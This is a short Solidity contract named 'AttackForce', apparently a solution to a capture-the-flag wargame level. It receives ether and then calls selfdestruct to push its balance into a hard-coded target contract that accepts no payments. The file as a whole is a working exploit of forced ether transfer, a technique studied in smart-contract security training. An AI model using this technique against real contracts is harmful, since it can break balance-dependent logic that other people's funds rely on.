// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackForce {

    // sending some eth to this contract first 
    receive() external payable {}

    // selfdestructing the contract 
    function youWillReceiveEther() external {
        selfdestruct(0x655C44E8AbdCe55Dd7928A0D1ed06963410Ec92A); //the address of the force contract
    }

}
